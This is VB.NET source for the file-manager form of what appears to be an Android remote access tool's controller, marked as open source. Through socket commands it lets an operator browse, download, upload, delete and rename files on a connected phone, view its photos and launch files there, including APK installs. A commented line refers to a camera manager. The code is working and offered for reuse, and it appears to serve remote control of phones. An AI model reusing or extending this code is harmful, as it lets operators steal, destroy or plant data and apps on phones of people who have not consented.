Public Class Android_filemanager
    '##################################################
    '################### CODED  #######################
    '##################### BY #########################
    '############### Saher Blue Eagle  ################
    '###############  XPR OPEN SOURCE  ################
    '##################################################
    '##################################################
    Public sock As Integer
    ' Form1.Server.Send_DX(sock, "camera_manager_find_camera" & SplitData)
    Protected Friend Sub back()
        If TextBox1.Text = "/" Then
            Exit Sub
        End If
        If TextBox1.Text = "" Then
            TextBox1.Text = "/"
            REFORMLIST()
            Exit Sub
        End If
        If TextBox1.Text.Length < 2 Then : TextBox1.Text = ""

            ListView1.Items.Clear()
            Form1.Server.Send_DX(sock, "file_manager" & SplitData & TextBox1.Text)

        Else

            TextBox1.Text = TextBox1.Text.Substring(0, TextBox1.Text.LastIndexOf("/"))
            TextBox1.Text = TextBox1.Text.Substring(0, TextBox1.Text.LastIndexOf("/") + 1)
            REFORMLIST()



        End If
        If TextBox1.Text = "" Then
            TextBox1.Text = "/"
            REFORMLIST()
            Exit Sub
        End If
        REFORMLIST()
    End Sub
    Protected Friend Function check_ifExist(ByVal x As String) As Boolean
        For Each item As ListViewItem In ListView1.Items
            If (item.Text).Equals(x) = True Then
                Return True
            End If
        Next
        Return False
    End Function
    Protected Friend Sub remove_itm(ByVal x As String)
        For Each item As ListViewItem In ListView1.Items
            If (item.Text).Equals(x) = True Then
                ListView1.Items.Remove(item)
                ListView1.Refresh()
            End If
        Next

    End Sub

    Protected Friend Sub REFORMLIST() Handles RefreshToolStripMenuItem.Click
        ListView1.Items.Clear()
        'refresh
        If TextBox1.Text = "" Then


            Form1.Server.Send_DX(sock, "file_manager" & SplitData)

        Else
            ListView1.Items.Clear()
            Me.ListView1.Items.Clear()
            Form1.Server.Send_DX(sock, "file_manager" & SplitData & TextBox1.Text)
        End If

    End Sub

    Private Sub RefreshToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles RefreshToolStripMenuItem.Click
        REFORMLIST()
    End Sub

    Private Sub Button2_Click(sender As System.Object, e As System.EventArgs) Handles Button2.Click
        back()

    End Sub

    Private Sub Android_filemanager_Load(sender As System.Object, e As System.EventArgs) Handles MyBase.Load
        TextBox1.Text = "/"
        Form1.Server.Send_DX(sock, "file_manager" & SplitData & "/")
    End Sub

    Private Sub ListView1_DoubleClick(sender As System.Object, e As System.EventArgs) Handles ListView1.DoubleClick
        If ListView1.SelectedItems.Count = 1 Then
            If ListView1.SelectedItems(0).ImageIndex = 0 Then
                TextBox1.Text &= ListView1.SelectedItems(0).Text & "/"
                REFORMLIST()
            Else
                Raised_Exption(TextBox1.Text & ListView1.SelectedItems(0).Text & "/", "Selected item is a file not a Valid Directory")
            End If

        End If
    End Sub

    Private Sub OpenFileInTextToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles OpenFileInTextToolStripMenuItem.Click
        '"notepad"
        If ListView1.SelectedItems.Count = 1 Then
            Form1.Server.Send_DX(sock, "notepad" & SplitData & TextBox1.Text & "/" & ListView1.SelectedItems(0).Text)
            REFORMLIST()
        End If

    End Sub

    Private Sub DeleteFileToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles DeleteFileToolStripMenuItem.Click
        '"file_manager_delete"

        If ListView1.SelectedItems.Count = 1 Then
            Dim result As Integer = MessageBox.Show("Are you sure to Delete this file from Android device ?", "Confirm File Delete", MessageBoxButtons.YesNo, MessageBoxIcon.Exclamation)
            If result = DialogResult.No Then
                Exit Sub
            ElseIf result = DialogResult.Yes Then
                Form1.Server.Send_DX(sock, "file_manager_delete" & SplitData & TextBox1.Text & "/" & ListView1.SelectedItems(0).Text & SplitData)
                REFORMLIST()
            End If

        End If
    End Sub
    Protected Friend Sub Raised_Exption(ByVal filename As String, ByVal exceptions As String)
        Label2.ForeColor = Color.Red
        Label2.Text = "Exception [File WRITE]" & vbNewLine
        Label2.Text &= "File Path : " & filename & vbNewLine
        Label2.Text &= "Exception : " & exceptions
        REFORMLIST()
    End Sub

    Private Sub UploadFileToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles UploadFileToolStripMenuItem.Click
        Dim str1 As String = "All (*.*)|*.*"
        Me.OpenFileDialog1.Filter = str1
        Me.OpenFileDialog1.FilterIndex = 0
        Me.OpenFileDialog1.FileName = Nothing

        If (Me.OpenFileDialog1.ShowDialog() = Windows.Forms.DialogResult.OK) Then
            Dim fileinfo1 As System.IO.FileInfo = New System.IO.FileInfo(Me.OpenFileDialog1.FileName)
            '"upload_file"
            If fileinfo1.Length < 150000 Then
                Form1.Server.Send_DX(sock, "upload_file" & SplitData & TextBox1.Text & "/" & SplitData & fileinfo1.Name & SplitData & tobase64(Me.OpenFileDialog1.FileName))
                REFORMLIST()
            Else
                MsgBox("File is too large to upload", MsgBoxStyle.Critical)
            End If

        End If

    End Sub
    Private Function tobase64(ByVal file As String) As Object
        Return Convert.ToBase64String(System.IO.File.ReadAllBytes(file))
    End Function

    Private Sub RenameFileToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles RenameFileToolStripMenuItem.Click

        If ListView1.SelectedItems.Count = 1 Then
            Dim newname As String = InputBox("Enter a new file name [With Extention]", "Rename File /Folder ", ListView1.SelectedItems(0).Text)
            If newname.Length > 1 Then
                '
                Form1.Server.Send_DX(sock, "file_manager_rename" & SplitData & TextBox1.Text & "/" & ListView1.SelectedItems(0).Text & SplitData & TextBox1.Text & "/" & newname & SplitData)
                REFORMLIST()
            End If
        End If

    End Sub

    Private Sub DownloadFileToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles DownloadFileToolStripMenuItem.Click
        '"download_manager"
        If ListView1.SelectedItems.Count = 1 Then
            If ListView1.SelectedItems(0).ImageIndex = 0 Then
                Raised_Exption(ListView1.SelectedItems(0).Text, ListView1.SelectedItems(0).Text & " is a Directory not a file to download")
                Exit Sub
            Else
                '
                Form1.Server.Send_DX(sock, "download_manager" & SplitData & TextBox1.Text & "/" & ListView1.SelectedItems(0).Text & SplitData)

            End If
        End If

    End Sub
    Protected Friend Sub Image_Viewer(ByVal img_vie_base64 As String)
        Dim tmpb64 As String = img_vie_base64
        Try
            Dim memorystream1 As System.IO.MemoryStream = New System.IO.MemoryStream(Convert.FromBase64String(tmpb64))
            Dim bitmap1 As System.Drawing.Bitmap = New System.Drawing.Bitmap(System.Drawing.Image.FromStream(memorystream1))
            Me.PictureBox1.Image = bitmap1

        Catch ex As Exception
            Me.PictureBox1.Image = Nothing
        End Try

    End Sub
    Private Sub ViewImageToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles ViewImageToolStripMenuItem.Click
        'view img
        ' "view_photo"
        If ListView1.SelectedItems.Count = 1 Then
            If ListView1.SelectedItems(0).ImageIndex = 0 Then
                Exit Sub
            Else
                '
                If ListView1.SelectedItems(0).ImageIndex = 11 Then
                    Form1.Server.Send_DX(sock, "view_photo" & SplitData & TextBox1.Text & "/" & ListView1.SelectedItems(0).Text & SplitData)
                End If


            End If
        End If
    End Sub

    Private Sub OpenDowloadsFolderToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles OpenDowloadsFolderToolStripMenuItem.Click
        If System.IO.Directory.Exists(Application.StartupPath & "\Mobile_Downloads\") Then
            Process.Start(Application.StartupPath & "\Mobile_Downloads\")
        Else
            Try
                System.IO.Directory.CreateDirectory(Application.StartupPath & "\Mobile_Downloads\")
                Process.Start(Application.StartupPath & "\Mobile_Downloads\")
            Catch ex As Exception
                MsgBox("Cannot Create Directory , Exception : " & ex.Message, MsgBoxStyle.Critical)
                Exit Sub
            End Try
        End If
    End Sub

    Private Sub AddNewFileToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles AddNewFileToolStripMenuItem.Click
        If ListView1.SelectedItems.Count = 0 Then
            Dim newname As String = InputBox("Enter [new file name]  [With Extention]", "Enter File name", "Newfile.txt")
            If newname.Length > 1 Then
                '
                Form1.Server.Send_DX(sock, "file_manager_write_file" & SplitData & TextBox1.Text & "/" & newname & SplitData & "False" & SplitData)
                REFORMLIST()
            End If
        End If

    End Sub

    Private Sub AddNewFolderToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles AddNewFolderToolStripMenuItem.Click
        If ListView1.SelectedItems.Count = 0 Then
            Dim newname As String = InputBox("Enter [new folder name]  [With Extention]", "Enter Folder name", "New Folder")
            If newname.Length > 1 Then

                Form1.Server.Send_DX(sock, "file_manager_write_file" & SplitData & TextBox1.Text & "/" & newname & SplitData & "True" & SplitData)
                REFORMLIST()
            End If
        End If
    End Sub
    Private Sub Open_ITM_with(ByVal open_with_what As String)

        If Me.ListView1.SelectedItems.Count = 1 Then
            Dim selecteditem_to_open As String = ListView1.SelectedItems(0).Text
            'Deleted for each item [i made only one selected item]
            Form1.Server.Send_DX(sock, "file_manager_start_playback" & SplitData & selecteditem_to_open & SplitData & open_with_what & SplitData)
        End If
    End Sub

    Dim rich_open_with As New RichTextBox
    Private Sub ContextMenuOpen_the_file_using()
        Try
            Dim contextmenustrip1 As System.Windows.Forms.ContextMenuStrip = New System.Windows.Forms.ContextMenuStrip()
            Me.ContextMenuStrip = Me.ContextMenuStrip1
            contextmenustrip1.ShowImageMargin = False
            contextmenustrip1.RenderMode = System.Windows.Forms.ToolStripRenderMode.System

            ' Dim str1 As String = System.Windows.Forms.Application.StartupPath & "\" & etonyps.store_0.name_folder_app_resource & "\OBU.inf"

            Dim richrich As New RichTextBox
            richrich.Text = My.Resources.OBU

            For Each line_S As String In richrich.Lines
                Dim str2 As String = line_S
                If (str2 IsNot Nothing AndAlso str2.Contains("{Package}")) Then

                    Dim array1 As String() = New String(0) {"{Package}"}
                    If (array1.Length() > 0) Then
                        Dim array2 As String() = str2.ToString().Split(array1, StringSplitOptions.RemoveEmptyEntries)
                        Dim toolstripmenuitem2 As System.Windows.Forms.ToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
                        toolstripmenuitem2.Text = array2(0)
                        '   toolstripmenuitem2.Name = "menu_item" & CType(num1, String)
                        toolstripmenuitem2.Tag = array2(1)
                        rich_open_with.Text &= array2(0) & "[ MY SPLIT ]" & array2(1) & vbNewLine

                        Dim toolstripmenuitem1 As System.Windows.Forms.ToolStripMenuItem = toolstripmenuitem2
                        '  AddHandler toolstripmenuitem1.Click, New EventHandler(AddressOf Me.mnuItem_Clicked)
                        contextmenustrip1.Items.Add(toolstripmenuitem1)
                    End If
                End If
            Next
            'for each line 


            Exit Sub

        Catch exception1 As Exception
            MsgBox(exception1.Message)
        End Try
    End Sub


    Private Sub PictureToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles PictureToolStripMenuItem.Click

        Open_ITM_with("image/*")
    End Sub

    Private Sub TextNotepadToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles TextNotepadToolStripMenuItem.Click
        Open_ITM_with("text/plain")
    End Sub

    Private Sub ApkInstallerToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles ApkInstallerToolStripMenuItem.Click
        Open_ITM_with("application/vnd.android.package-archive")
    End Sub

    Private Sub PictureGifToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles PictureGifToolStripMenuItem.Click
        Open_ITM_with("image/gif")
    End Sub

    Private Sub PictureJpgjpegToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles PictureJpgjpegToolStripMenuItem.Click
        Open_ITM_with("image/jpeg")
    End Sub

    Private Sub Video3gpmpgToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles Video3gpmpgToolStripMenuItem.Click
        Open_ITM_with("video/*")
    End Sub

    Private Sub AudioWavmp3ToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles AudioWavmp3ToolStripMenuItem.Click
        Open_ITM_with("audio/x-wav")
    End Sub

    Private Sub WordPadRtfToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles WordPadRtfToolStripMenuItem.Click
        Open_ITM_with("application/rtf")
    End Sub

    Private Sub AdobePdfToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles AdobePdfToolStripMenuItem.Click
        Open_ITM_with("application/pdf")
    End Sub

    Private Sub DocumentDocdocxToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles DocumentDocdocxToolStripMenuItem.Click
        Open_ITM_with("application/msword")
    End Sub

    Private Sub PowerpointPptpptxToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles PowerpointPptpptxToolStripMenuItem.Click
        Open_ITM_with("application/vnd.ms-powerpoint")
    End Sub

    Private Sub ExcelXlsxlsxToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles ExcelXlsxlsxToolStripMenuItem.Click
        Open_ITM_with("application/vnd.ms-excel")
    End Sub

    Private Sub FileZiprarToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles FileZiprarToolStripMenuItem.Click
        Open_ITM_with("application/zip")
    End Sub

    Private Sub UnknownToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles UnknownToolStripMenuItem.Click
        Open_ITM_with("*/*")
    End Sub

    Private Sub SetWallpaperToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles SetWallpaperToolStripMenuItem.Click
        'Set wallpaper
    End Sub

    Private Sub ListView1_SelectedIndexChanged(sender As System.Object, e As System.EventArgs) Handles ListView1.SelectedIndexChanged
        Me.PictureBox1.Image = Nothing
    End Sub

    Private Sub Button1_Click(sender As System.Object, e As System.EventArgs) Handles Button1.Click
        If ListView1.SelectedItems.Count = 1 Then
            If ListView1.SelectedItems(0).ImageIndex = 0 Then
                Raised_Exption(ListView1.SelectedItems(0).Text, ListView1.SelectedItems(0).Text & " is a Directory not a file to download")
                Exit Sub
            Else
                '
                If ListView1.SelectedItems(0).ImageIndex = 11 Then
                    Form1.Server.Send_DX(sock, "download_manager" & SplitData & TextBox1.Text & "/" & ListView1.SelectedItems(0).Text & SplitData)
                End If


            End If
        End If
    End Sub
End Class